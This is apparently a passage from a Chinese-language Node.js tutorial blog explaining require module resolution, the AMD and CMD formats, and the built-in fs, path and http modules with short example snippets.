<p>require &#x662F;&#x5E2E;&#x52A9;&#x5F15;&#x5165;&#x6A21;&#x5757;&#x5BFC;&#x51FA;&#x5BF9;&#x8C61;&#x7684;<a href="https://stackoverflow.com/questions/20315434/node-js-asynchronous-module-loading">&#x540C;&#x6B65;&#x51FD;&#x6570;</a>&#x3002;require &#x67E5;&#x627E;&#x6A21;&#x5757;&#x9996;&#x5148;&#x4F1A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x6838;&#x5FC3;&#x6A21;&#x5757;&#xFF0C;&#x662F;&#x5219;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x5E76;&#x505C;&#x6B62;&#x67E5;&#x627E;&#xFF1B;&#x4E0D;&#x662F;&#x5219;&#x5206;&#x7C7B;&#x8BA8;&#x8BBA;&#x3002;</p>
<p>&#x5F53; <code>./</code>&#x3001;<code>../</code> &#x6216; <code>/</code> &#x5F00;&#x5934;&#x7684;&#x6587;&#x4EF6;&#x6709;&#x540E;&#x7F00;&#x540D;&#x65F6;&#xFF0C;&#x5148;&#x6309;&#x6307;&#x5B9A;&#x540E;&#x7F00;&#x67E5;&#x627E;&#xFF0C;&#x6CA1;&#x6709;&#x5219;&#x6309; js &#x6587;&#x4EF6;&#x3001;json &#x6587;&#x4EF6;&#x3001;node &#x6587;&#x4EF6;&#x7684;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x3002;&#x82E5;&#x4ECD;&#x65E0;&#x76F8;&#x5E94;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x6309;&#x76EE;&#x5F55;&#x540D;&#x67E5;&#x627E;&#x3002;</p>
<p>&#x76EE;&#x5F55;&#x540D;&#x67E5;&#x627E; =&gt; &#x4ECE;&#x6700;&#x8FD1;&#x7684; node_modules &#x6587;&#x4EF6;&#x5939;&#x67E5;&#x5230;&#x6839;&#x76EE;&#x5F55;&#x7684; node_modules &#x6587;&#x4EF6;&#x5939;&#x3002;</p>
<ul>
<li>&#x6A21;&#x5757;&#x7684;&#x52A0;&#x8F7D;&#x8FC7;&#x7A0B;</li>
</ul>
<p>&#x6A21;&#x5757;&#x9996;&#x6B21;&#x5F15;&#x5165;&#x65F6;&#x4F1A;&#x76F4;&#x63A5;&#x8FD0;&#x884C;&#x4E00;&#x6B21;&#xFF1B;&#x6A21;&#x5757;&#x88AB;&#x591A;&#x6B21;&#x5F15;&#x5165;&#x4E5F;&#x53EA;&#x4F1A;&#x52A0;&#x8F7D;&#x4E00;&#x6B21;&#x3002;&#x56E0;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x8C61;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5C5E;&#x6027; loaded &#x8868;&#x793A;&#x52A0;&#x8F7D;&#x5B8C;&#x6210;&#x7684;&#x72B6;&#x6001;&#x3002;</p>
<pre><code class="language-javascript">/* module &#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027; */
module.id &#x6A21;&#x5757;&#x7684;&#x8BC6;&#x522B;&#x7B26;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x5E26;&#x6709;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x7684;&#x6A21;&#x5757;&#x6587;&#x4EF6;&#x540D;&#x3002;
module.filename &#x6A21;&#x5757;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x5E26;&#x6709;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x3002;
module.loaded &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5E03;&#x5C14;&#x503C;&#xFF0C;&#x8868;&#x793A;&#x6A21;&#x5757;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x52A0;&#x8F7D;&#x3002;
module.parent &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x8868;&#x793A;&#x8C03;&#x7528;&#x8BE5;&#x6A21;&#x5757;&#x7684;&#x6A21;&#x5757;&#xFF08;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x7684;module.parent&#x4E3A;null&#xFF09;
module.children &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x8868;&#x793A;&#x8BE5;&#x6A21;&#x5757;&#x8981;&#x7528;&#x5230;&#x7684;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x3002;
module.exports &#x8868;&#x793A;&#x6A21;&#x5757;&#x5BF9;&#x5916;&#x8F93;&#x51FA;&#x7684;&#x503C;&#x3002;
</code></pre>
<p>&#x7B97;&#x6CD5;&#x4E2D;&#x56FE;&#x7ED3;&#x6784;&#x5728;&#x904D;&#x5386;&#x65F6;&#x6709;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#x548C;&#x5E7F;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#xFF0C;&#x6A21;&#x5757;&#x5728;&#x5F15;&#x5165;&#x65F6;&#x91C7;&#x7528;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#x3002;&#x4E0B;&#x56FE;&#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x4E3A; main&#x3001;a&#x3001;c&#x3001;d&#x3001;e&#x3001;b&#x3002;</p>
<img src="https://res.cloudinary.com/dzb9ldnvl/image/upload/v1672310187/blog/zsghost/svg/moduleLoadOrder_buarvg.svg" style="overflow:scroll" alt="NodeJS">
<ul>
<li>&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x5316; =&gt; AMD &#x548C; CMD</li>
</ul>
<p>AMD &#x662F; Asynchronous Module Definition &#x79FB;&#x6B65;&#x6A21;&#x5757;&#x5316;&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x91C7;&#x7528;&#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x3002;&#x5E38;&#x7528;&#x7684;&#x5E93;&#x662F; require.js &#x548C; curl.js&#x3002;</p>
<pre><code class="language-html">&lt;script src=&quot;./lib/require.js&quot; data-main=&quot;./index.js&quot;&gt;&lt;/script&gt;
</code></pre>
<pre><code class="language-js">// index.js
(function(){
  require.config({
    baseUrl: &apos;&apos;,
    path: {
      &quot;bar&quot;: &quot;./modules/bar&quot;, // &#x5BF9;&#x5E94;&#x6A21;&#x5757;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;
      &quot;foo&quot;: &quot;./modules/foo&quot;
    }
  })
  require([&apos;foo&apos;], function(foo){})
})()
</code></pre>
<pre><code class="language-javascript">// bar.js
define(function() {
  const name = &quot;zszs&quot;;
  const age = 21;
  const sayHello = function(){
    console.log(&quot;hi&quot; + name);
  }
  return {
    name: name,
    age: age,
    sayHello: sayHello
  }
})
</code></pre>
<pre><code class="language-javascript">// foo.js
define([&apos;bar&apos;], function(bar){
  console.log(bar.name);
  console.log(bar.age);
  bar.sayHello(&quot;zy&quot;);
})
</code></pre>
<p>CMD &#x662F; Common Module Definition &#x901A;&#x7528;&#x6A21;&#x5757;&#x5B9A;&#x4E49;&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x4E5F;&#x91C7;&#x7528;&#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x3002;&#x5B9E;&#x73B0;&#x65B9;&#x6848;&#x662F; SeaJS&#x3002;</p>
<pre><code class="language-html">&lt;script src=&quot;./lib.sea.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
  seajs.use(&apos;./index.js&apos;)
&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">// index.js
define(function(require, exports, module){
  const foo = require(&apos;./modules/foo&apos;);
  console.log(foo.name);
  console.log(foo.age)
  console.log(foo.sayHello(&apos;zy&apos;))
})
</code></pre>
<pre><code class="language-javascript">// foo.js
define(function(require, exports, module){
  const name = &quot;zs&quot;;
  const age = 21;
  const sayHello = function(name){
    console.log(&quot;hi&quot; + name);
  }
  module.exports = {
    name,
    age,
    sayHello
  }
})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97">&#x5185;&#x7F6E;&#x6A21;&#x5757;</h2>
<h3 id="file-system">File system</h3>
<p>&#x4EFB;&#x4F55;&#x4E3A;&#x670D;&#x52A1;&#x7AEF;&#x670D;&#x52A1;&#x7684;&#x8BED;&#x8A00;&#x6216;&#x6846;&#x67B6;&#x901A;&#x5E38;&#x4F1A;&#x6709;&#x5404;&#x81EA;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;fs &#x6A21;&#x5757;&#x7528;&#x4E8E;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4EA4;&#x4E92;&#x3002;</p>
<ul>
<li>fs.existsSync(path) =&gt; &#x68C0;&#x67E5;&#x4F20;&#x53C2; path &#x662F;&#x5426;&#x5B58;&#x5728;&#xFF1B;&#x5F02;&#x6B65; fs.exists &#x5DF2;&#x5E9F;&#x5F03;</li>
</ul>
<p>Node &#x5927;&#x90E8;&#x5206;&#x5F02;&#x6B65; API &#x4F1A;&#x6709;&#x56DE;&#x8C03;&#x51FD;&#x6570; callback &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x800C;&#x5927;&#x90E8;&#x5206;&#x540C;&#x6B65; API &#x4E0D;&#x4F1A;&#x3002;</p>
<pre><code class="language-javascript">// &#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x5939;
const fs = require(&apos;fs&apos;)
const dirname = &apos;./testDirectory&apos;
if(!fs.existsSync(dirname)){
  fs.mkdir(dirname, err =&gt; { console.log(err); });
}
</code></pre>
<ul>
<li>fs.readdir(path[, options], callback) =&gt; &#x8BFB;&#x53D6;&#x76EE;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#xFF1B;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570; files &#x662F;&#x76EE;&#x5F55;&#x4E2D;&#x6587;&#x4EF6;&#x540D;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x4E0D;&#x9012;&#x5F52;&#x5411;&#x4E0B;</li>
</ul>
<pre><code class="language-javascript">// &#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5939;&#x6240;&#x6709;&#x6587;&#x4EF6;
const fs = require(&apos;fs&apos;)
fs.readdir(&quot;./testDirectory&quot;, (err, files) =&gt; {
  console.log(files)
})
</code></pre>
<ul>
<li>fs.rename(oldPath, newPath, callback) =&gt; &#x5BF9;&#x6587;&#x4EF6;&#x5F02;&#x6B65;&#x91CD;&#x547D;&#x540D;&#xFF1B;newPath &#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6587;&#x4EF6;&#x4F1A;&#x88AB;&#x8986;&#x76D6;&#xFF0C;&#x76EE;&#x5F55;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;</li>
</ul>
<pre><code class="language-javascript">// &#x91CD;&#x547D;&#x540D;
const fs = require(&apos;fs&apos;);
fs.rename(&quot;./files/dirtest&quot;, &quot;./files/dirtestandrename&quot;, err =&gt; {
  console.log(err)
})
</code></pre>
<ul>
<li>fs.readFile(path[, options], callback) =&gt; &#x5F02;&#x6B65;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x5168;&#x90E8;&#x5185;&#x5BB9;</li>
</ul>
<p>fs.readFile() &#x662F;&#x5BF9; fs.read() &#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x540E;&#x8005;&#x4F7F;&#x7528;&#x6D41;&#x7A0B;&#x5E94;&#x5148;&#x7528; fs.stat() or fs.fstat() &#x83B7;&#x53D6;&#x5BF9;&#x8C61;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;&#x518D;&#x901A;&#x8FC7; fs.open() &#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26; fd&#xFF0C;&#x6700;&#x540E;&#x624D;&#x80FD;&#x4EE5; fs.read() &#x8BFB;&#x53D6;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="language-javascript">// readFile() &#x8BFB;&#x53D6;&#x6587;&#x4EF6;
const fs = require(&quot;fs&quot;);
fs.readFile(&quot;./files/1.txt&quot;, {encoding: &apos;utf-8&apos;}, function (err, dataStr) {
  if (err) { return console.log(&quot;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5931;&#x8D25;!&quot; + err.message); } // &#x8BFB;&#x53D6;&#x6210;&#x529F;&#x5219; err &#x7684;&#x7ED3;&#x679C;&#x4E3A; null, &#x5931;&#x8D25;&#x5219; dataStr &#x7684;&#x7ED3;&#x679C;&#x4E3A; undefine
  return console.log(&quot;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x6210;&#x529F;!&quot; + dataStr);
});
</code></pre>
<ul>
<li>fs.writeFile(file, data[, options], callback) =&gt; &#x5F53; file &#x662F;&#x6587;&#x4EF6;&#x540D;&#x65F6;&#xFF0C;&#x5F02;&#x6B65;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x5DF2;&#x5B58;&#x5728;&#x5219;&#x66FF;&#x6362;&#x6587;&#x4EF6;&#xFF1B;<a href="https://nodejs.org/api/fs.html#file-system-flags">&#x8FFD;&#x52A0;&#x5185;&#x5BB9;</a></li>
</ul>
<pre><code class="language-javascript">// &#x5199;&#x5165;&#x6587;&#x4EF6;&#x5185;&#x5BB9;
const fs = require(&quot;fs&quot;);
fs.writeFile(&quot;./files/toBeWrite.txt&quot;, &quot;Hello node.js!&quot;, function (err) {
  if (err) { return console.log(&quot;&#x6587;&#x4EF6;&#x5199;&#x5165;&#x5931;&#x8D25;&quot; + err.message); } // &#x6587;&#x4EF6;&#x5199;&#x5165;&#x6210;&#x529F; err &#x503C;&#x7B49;&#x4E8E; null, &#x6587;&#x4EF6;&#x5199;&#x5165;&#x5931;&#x8D25;&#xFF0C;&#x5219; err &#x7684;&#x503C;&#x4E3A;&#x9519;&#x8BEF;&#x5BF9;&#x8C61;
  console.log(&quot;&#x6587;&#x4EF6;&#x5199;&#x5165;&#x6210;&#x529F;&quot;);
});
</code></pre>
<pre><code class="language-javascript">// &#x8FFD;&#x52A0;&#x6587;&#x4EF6;&#x5185;&#x5BB9;
const fs = require(&quot;fs&quot;);
fs.writeFile(&quot;./files/toBeWrite.txt&quot;, &quot;\r\nHello node.js!&quot;, {flag: &quot;a&quot;}, function (err) {
  if (err) { return console.log(&quot;&#x6587;&#x4EF6;&#x5199;&#x5165;&#x5931;&#x8D25;&quot; + err.message); } // &#x6587;&#x4EF6;&#x8FFD;&#x52A0;&#x6210;&#x529F; err &#x503C;&#x7B49;&#x4E8E; null, &#x6587;&#x4EF6;&#x8FFD;&#x52A0;&#x5931;&#x8D25;&#xFF0C;&#x5219; err &#x7684;&#x503C;&#x4E3A;&#x9519;&#x8BEF;&#x5BF9;&#x8C61;
  console.log(&quot;&#x6587;&#x4EF6;&#x8FFD;&#x52A0;&#x6210;&#x529F;&quot;);
});
</code></pre>
<ul>
<li>fs.appendFile(path, data[, options], callback) =&gt; &#x5C06;&#x6570;&#x636E;&#x5F02;&#x6B65;&#x9644;&#x52A0;&#x5230;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x5C1A;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x3002;data&#x53EF;&#x4EE5;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x6216;&lt;Buffer&gt;&#x3002;</li>
</ul>
<pre><code class="language-javascript">// &#x8FFD;&#x52A0;&#x6587;&#x4EF6;&#x5185;&#x5BB9;
const fs = require(&quot;fs&quot;);
fs.appendFile(&quot;./files/toBeWrite.txt&quot;, &quot;\r\n&apos;data to append&apos;&quot;, function (err) {
  if (err) { return console.log(&quot;&#x6587;&#x4EF6;&#x8FFD;&#x52A0;&#x5931;&#x8D25;&quot; + err.message); } // &#x6587;&#x4EF6;&#x5199;&#x5165;&#x6210;&#x529F; err &#x503C;&#x7B49;&#x4E8E; null, &#x6587;&#x4EF6;&#x5199;&#x5165;&#x5931;&#x8D25;&#xFF0C;&#x5219; err &#x7684;&#x503C;&#x4E3A;&#x9519;&#x8BEF;&#x5BF9;&#x8C61;
  console.log(&quot;&#x6587;&#x4EF6;&#x8FFD;&#x52A0;&#x6210;&#x529F;&quot;);
});
</code></pre>
<blockquote>
<p>&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26; file descriptors fd =&gt; POSIX &#x7CFB;&#x7EDF;&#x5BF9;&#x4E8E;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x5185;&#x6838;&#x90FD;&#x7EF4;&#x62A4;&#x7740;&#x4E00;&#x5F20;&#x5F53;&#x524D;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x8D44;&#x6E90;&#x8868;&#x683C;&#x3002;&#x6BCF;&#x4E2A;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x5206;&#x914D;&#x4E86;&#x4E00;&#x4E2A;&#x79F0;&#x4E3A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x7B80;&#x5355;&#x6570;&#x5B57;&#x6807;&#x8BC6;&#x7B26;&#x3002;&#x5728;&#x7CFB;&#x7EDF;&#x5C42;&#xFF0C;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x64CD;&#x4F5C;&#x90FD;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;&#x548C;&#x8DDF;&#x8E2A;&#x7279;&#x70B9;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x4E3A;&#x7B80;&#x5316;&#x7528;&#x6237;&#x5DE5;&#x4F5C;&#xFF0C;Node &#x62BD;&#x8C61;&#x51FA;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x5DEE;&#x5F02;&#xFF0C;&#x5E76;&#x4E3A;&#x6240;&#x6709;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x578B;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;</p>
</blockquote>
<pre><code class="language-javascript">const fs = require(&quot;fs&quot;);
const path = require(&quot;path&quot;);
const fdfilepath = path.resolve(__dirname + &quot;/files/fd.txt&quot;);
fs.open(fdfilepath, (err, fd) =&gt; {
  if (err) { return; }
  fs.fstat(fd, (err, info) =&gt; {});
});
const content = &quot;hello fd&quot;;
fs.writeFile(&quot;./files/fd.txt&quot;, content, { flag: &quot;a&quot; }, (err) =&gt; { console.log(err); });
fs.readFile(&quot;./files/fd.txt&quot;, null, (err, data) =&gt; { console.log(data.toString()); }); // &lt;Buffer&gt; =&gt; 16&#x8FDB;&#x5236;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x4E00;&#x79CD;&#x8868;&#x73B0;&#x5F62;&#x5F0F;
</code></pre>
<h3 id="path">Path</h3>
<p>path &#x6A21;&#x5757;&#x63D0;&#x4F9B;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C4F;&#x853D;&#x4E0D;&#x540C;&#x73AF;&#x5883;&#x4E0B;&#x5206;&#x9694;&#x7B26;&#x7684;&#x5DEE;&#x5F02;&#x3002;</p>
<ul>
<li>path.basename(path[, ext]) =&gt; &#x8FD4;&#x56DE;&#x6700;&#x672B;&#x5C3E;&#x5206;&#x9694;&#x7B26;&#x7684;&#x540E;&#x7EED;&#x90E8;&#x5206;&#xFF1B;ext -&gt; &#x53EF;&#x9009;&#x7684;&#x6587;&#x4EF6;&#x6269;&#x5C55;&#x540D;&#xFF0C;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
console.log(path.extname(&quot;/a/b/c.java&quot;), path.basename(&quot;/a/b/c.java&quot;), path.basename(&quot;/a/b/c.java&quot;, &apos;.java&apos;)) // .java c.java c
</code></pre>
<ul>
<li>path.delimiter =&gt; &#x63D0;&#x4F9B;&#x7279;&#x5B9A;&#x4E8E;&#x5E73;&#x53F0;&#x7684;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
console.log(process.env.PATH.split(path.delimiter)) // [...]
</code></pre>
<ul>
<li>path.dirname(path) =&gt; &#x8FD4;&#x56DE;&#x8DEF;&#x5F84;&#x76EE;&#x5F55;&#x540D;&#x79F0;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
console.log(path.dirname(&apos;/a/b/c&apos;)) // /a/b
</code></pre>
<ul>
<li>path.extname(path) =&gt; &#x8FD4;&#x56DE;&#x8DEF;&#x5F84;&#x62D3;&#x5C55;&#x540D;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
console.log(path.extname(&apos;index.coffee.md&apos;)) // .md
</code></pre>
<ul>
<li>path.normalize(path) =&gt; &#x89C4;&#x8303;&#x5316;&#x7ED9;&#x5B9A;&#x7684;&#x8DEF;&#x5F84; -&gt; &#x591A;&#x4E2A;&#x8FDE;&#x7EED;&#x7684;&#x8DEF;&#x5F84;&#x6BB5;&#x5206;&#x9694;&#x7B26;&#x4F1A;&#x88AB;&#x7279;&#x5B9A;&#x4E8E;&#x5E73;&#x53F0;&#x7684;&#x8DEF;&#x5F84;&#x6BB5;&#x5206;&#x9694;&#x7B26;&#x7684;&#x5355;&#x4E2A;&#x5B9E;&#x4F8B;&#x66FF;&#x6362;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
var pathStr = path.normalize(&quot;a/b//c///d\\\e&quot;);
console.log(pathStr); // a/b/c/d\e
</code></pre>
<ul>
<li>path.parse(path) =&gt; &#x8FD4;&#x56DE;&#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x5C5E;&#x6027;&#x8868;&#x793A;&#x8DEF;&#x5F84;&#x6709;&#x6548;&#x5143;&#x7D20;</li>
</ul>
<pre><code class="language-javascript">var {parse} = require(&quot;path&quot;);
console.log(parse(&quot;/a/b/c.java&quot;)) // { root: &apos;/&apos;, dir: &apos;/a/b&apos;, base: &apos;c.java&apos;, ext: &apos;.java&apos;, name: &apos;c&apos; }
</code></pre>
<ul>
<li>path.format(pathObject) =&gt; &#x628A;&#x5BF9;&#x8C61;&#x8F6C;&#x5316;&#x4E3A;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;</li>
</ul>
<pre><code class="language-javascript">var {format} = require(&quot;path&quot;);
console.log(format({ root: &apos;/&apos;, dir: &apos;/a/b&apos;, base: &apos;c.java&apos;, ext: &apos;.java&apos;, name: &apos;c&apos; })) // /a/b/c.java
</code></pre>
<ul>
<li>path.resolve([...paths]) =&gt; &#x5C06;&#x4E00;&#x7CFB;&#x5217;&#x8DEF;&#x5F84;&#x6216;&#x8DEF;&#x5F84;&#x6BB5;&#x89E3;&#x6790;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</li>
</ul>
<pre><code class="language-javascript">var path = require(&apos;path&apos;) // &#x82E5;&#x4E0D;&#x4F20;&#x5165; path &#x5219;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
console.log(path.resolve(&apos;a/b/c&apos;)) // &#x62FC;&#x63A5;&#x5F53;&#x524D;&#x7684;&#x76EE;&#x5F55; =&gt; /Users/xieziyi/a/b/c
</code></pre>
<ul>
<li>path.join([...paths]) =&gt; &#x4F7F;&#x7528;&#x7279;&#x5B9A;&#x4E8E;&#x5E73;&#x53F0;&#x7684;&#x5206;&#x9694;&#x7B26;&#x4F5C;&#x4E3A;&#x5206;&#x9694;&#x7B26;&#x5C06;&#x6240;&#x6709;&#x7ED9;&#x5B9A;&#x7684;&#x6BB5;&#x8FDE;&#x63A5;</li>
</ul>
<pre><code class="language-javascript">var {join} = require(&apos;path&apos;)
console.log(join(&apos;a&apos;,&apos;/b&apos;,&apos;../c&apos;,&apos;/d&apos;)) // a/c/d
</code></pre>
<p>&#x4E24;&#x8005;&#x90FD;&#x6709;&#x8FDE;&#x63A5;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x524D;&#x8005;&#x4F1A;&#x5224;&#x65AD;&#x62FC;&#x63A5;&#x5B57;&#x7B26;&#x4E32;&#x8DEF;&#x5F84;&#x662F;&#x5426;&#x5305;&#x542B;&#x4EE5; / &#x6216; ./ &#x6216; ../ &#x5F00;&#x5934;&#x7684;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;&#xFF0C;&#x5E76;&#x4EE5;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;&#x62FC;&#x63A5;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x8DEF;&#x5F84;&#x3002;</p>
<p>&#x4EE5; / &#x5F00;&#x5934; resolve &#x548C; join &#x6548;&#x679C;&#x4E00;&#x81F4;&#xFF0C;./ &#x6216; ../ &#x5219;&#x4F1A;&#x62FC;&#x63A5;&#x4E0A;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x4F4D;&#x7F6E;&#x8DEF;&#x5F84;&#x3002;</p>
<ul>
<li>path.sep =&gt; &#x63D0;&#x4F9B;&#x7279;&#x5B9A;&#x4E8E;&#x5E73;&#x53F0;&#x7684;&#x8DEF;&#x5F84;&#x6BB5;&#x5206;&#x9694;&#x7B26;</li>
</ul>
<pre><code class="language-javascript">var path = require(&quot;path&quot;);
console.log(&apos;a/b/c&apos;.split(path.sep)); // [ &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]
</code></pre>
<h3 id="http">Http</h3>
<p>&#x4E0D;&#x540C;&#x4E8E; Tomcat &#x6216; Apache &#x7B49;&#x5BB9;&#x5668;&#xFF0C;http &#x6A21;&#x5757;&#x5177;&#x6709;&#x521B;&#x5EFA;&#x670D;&#x52A1;&#x5668;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
<ul>
<li>http.createServer([options][, requestListener]) =&gt; &#x521B;&#x5EFA; Web &#x670D;&#x52A1;&#x5668;</li>
</ul>
<pre><code class="language-javascript">const http = require(&apos;node:http&apos;);
const server = http.createServer((req, res) =&gt; { // Create a local server
  // &#x6307;&#x5B9A;&#x7F16;&#x7801;&#x5BF9;&#x4E8E; JSON &#x6765;&#x8BF4;&#x6709;&#x4E9B;&#x591A;&#x4F59; =&gt; &#x56E0;&#x4E3A; JSON &#x7684;&#x9ED8;&#x8BA4;&#x7F16;&#x7801;&#x662F; UTF-8
  res.writeHead(200, { &apos;Content-Type&apos;: &apos;application/json; charset=utf-8&apos; });
  res.end(JSON.stringify({ data: &apos;Hello World!&apos; }));
});
server.listen(8000);
</code></pre>
<ul>
<li>request.setHeader(name, value) =&gt; &#x4E3A;&#x6807;&#x5934;&#x5BF9;&#x8C61;&#x8BBE;&#x7F6E;&#x5355;&#x4E2A;&#x6807;&#x5934;&#x503C;</li>
</ul>
<pre><code class="language-javascript">const http = require(&apos;node:http&apos;);
const server = http.createServer((req, res) =&gt; {
  const body = &apos;hello world&apos;;
  res.setHeader(&quot;Content-Length&quot;, body.length);
  res.setHeader(&quot;Content-Type&quot;, &quot;text/plain&quot;);
  res.setHeader(&quot;Set-Cookie&quot;, &quot;type=ninja&quot;);
  res.statusCode = 200; // response.statusCode =&gt; &#x4F7F;&#x7528;&#x9690;&#x5F0F;&#x6807;&#x5934;&#x65F6;&#x5C06;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x72B6;&#x6001;&#x4EE3;&#x7801;
  res.statusMessage = &apos;ok&apos;
  res.end(body);
});
server.listen(8000);
</code></pre>
<ul>
<li>response.writeHead(statusCode[, statusMessage][, headers]) =&gt; &#x5411;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x54CD;&#x5E94;&#x6807;&#x5934;</li>
</ul>
<pre><code class="language-javascript">const http = require(&apos;node:http&apos;);
const server = http.createServer((req, res) =&gt; {
  const body = &apos;hello world&apos;;
  res.writeHead(200, {
    &apos;Content-Length&apos;: Buffer.byteLength(body),
    &apos;Content-Type&apos;: &apos;text/plain&apos;
  })
  .end(body);
});
server.listen(8000);
</code></pre>
<ul>
<li>url.parse(urlString[, parseQueryString[, slashesDenoteHost]]) =&gt; &#x89E3;&#x6790; URL &#x5B57;&#x7B26;&#x4E32; -&gt; &#x8DEF;&#x5F84;&#x53C2;&#x6570;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x9700;&#x8981;&#x89E3;&#x6790;&#x3001;&#x5206;&#x9694;&#x8F6C;&#x6210;&#x5BF9;&#x8C61;</li>
</ul>
